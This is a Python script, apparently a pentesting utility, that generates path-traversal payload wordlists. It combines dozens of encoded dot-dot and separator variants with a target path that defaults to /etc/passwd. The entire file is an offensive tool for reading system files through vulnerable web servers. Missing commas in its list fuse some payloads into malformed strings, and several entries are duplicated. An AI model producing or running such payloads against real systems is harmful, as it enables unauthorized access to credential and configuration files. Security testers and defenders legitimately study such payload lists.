#!/usr/bin/python3

import argparse
import os

def validate_arguments(args):
    if args.min > args.max:
        raise ValueError("Max value must be greater than or equal to min value")
    if args.output and not os.access(args.output, os.W_OK):
        raise ValueError("Output path is not writable")

def add_path(encode, path):
    result = ""
    for i in path:
        if i == '/' or i == '\\':
            result += encode
        else:
            result += i
    return result + '\n'

def create_directory(min, max, path, output):

    result = ""

    content_array = [
    '../;/',
    '..%2f;%2f',
    '%2e%2e/;/',
    '%2e%2e%2f;%2f',
    '..%252f;%252f',
    '%252e%252e/;/',
    '%252e%252e%252f;%252f',
    '..\\;\\',
    '..%255c;%255c',
    '%252e%252e\\;\\',
    '..%5c;%5c',
    '%2e%2e\\;\\',
    '%2e%2e%5c;%5c',
    '%252e%252e\\;\\',
    '..%255c;%255c',
    '%252e%252e%255c;%255c',
    '..%c0%af;%c0%af',
    '%c0%ae%c0%ae/;/',
    '%c0%ae%c0%ae%c0%af;%c0%af',
    '..%25c0%25af;%25c0%25af',
    '%25c0%25ae%25c0%25ae/;/',
    '%25c0%25ae%25c0%25ae%25c0%25af;%25c0%25af',
    '..%c1%9c;%c1%9c',
    '%c0%ae%c0%ae\\;\\',
    '%c0%ae%c0%ae%c1%9c;%c1%9c',
    '..%25c1%259c;%25c1%259c',
    '%25c0%25ae%25c0%25ae\\;\\',
    '%25c0%25ae%25c0%25ae%25c1%259c;%25c1%259c',
    '..%%32%66;%%32%66',
    '%%32%65%%32%65/;/',
    '%%32%65%%32%65%%32%66;%%32%66',
    '..%%35%63;%%35%63',
    '%%32%65%%32%65%%35%63;%%35%63',
    '\../;/',
    '/..\\;\\'
    '.../;/',
    '...\\;\\'
    '..../;/',
    '....\\;\\',
    '..%u2215;%u2215',
    '%uff0e%uff0e/;/',
    '%uff0e%uff0e%u2215;%u2215',
    '..%u2216;%u2216',
    '..%uEFC8;%uEFC8',
    '..%uF025;%uF025',
    '%uff0e%uff0e\\;\\',
    '%uff0e%uff0e%u2216;%u2216',
    '..0x2f;0x2f',
    '0x2e0x2e/;/',
    '0x2e0x2e0x2f;0x2f',
    '..0x5c;0x5c',
    '0x2e0x2e\\;\\',
    '0x2e0x2e0x5c;0x5c',
    '..%c0%2f;%c0%2f',
    '%c0%2e%c0%2e/;/',
    '%c0%2e%c0%2e%c0%2f;%c0%2f',
    '..%c0%5c;%c0%5c',
    '%c0%2e%c0%2e\\;\\',
    '%c0%2e%c0%2e%c0%5c;%c0%5c',
    '..//;//',
    '..///;///',
    '..\\\\;\\\\',
    '..\\\\\\;\\\\\\',
    './\/./;/\/./',
    './\/.\\;\\/\\.\\',
    './../;/./',
    '.\..\\;\\.\\',
    '.\\\\..\\\\;\\\\.\\\\',
    './/..//;//.//'
    ]

    for encode in content_array:

        dot = encode.split(';')[0]
        path_separator = encode.split(';')[1]

        for current in range(min, max + 1, 1):
            for i in range(max, max - current, -1):
                result += dot
            result += add_path(path_separator, path)

    if output == '':
        print(result)
    else:
        os.makedirs(os.path.dirname(output), exist_ok=True)
        with open(output, 'w') as file:
            file.write(result)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Path traversal")
    parser.add_argument("--min", type=int, default=1, help="Minimum value")
    parser.add_argument("--max", type=int, default=5, help="Maximum value")
    parser.add_argument("--path", type=str, default='/etc/passwd', help="Path")
    parser.add_argument("--output", type=str, default='', help="Output filepath")

    args = parser.parse_args()

    validate_arguments(args)

    create_directory(args.min, args.max, args.path, args.output)
